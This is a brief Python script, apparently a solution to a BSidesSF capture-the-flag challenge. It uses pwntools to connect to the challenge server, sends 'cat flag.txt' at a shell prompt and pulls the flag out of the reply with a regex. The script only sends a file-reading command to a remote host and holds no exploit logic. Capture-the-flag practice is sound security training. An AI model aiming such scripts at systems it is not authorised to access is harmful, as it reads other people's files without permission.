from pwn import *
import re

r = remote('meow-d2e3a210.challenges.bsidessf.net', 4445)

r.sendlineafter(b'$ ', b'cat flag.txt')

flag = r.recv().strip().decode()

print(re.search(r'CTF{.+}', flag).group(0))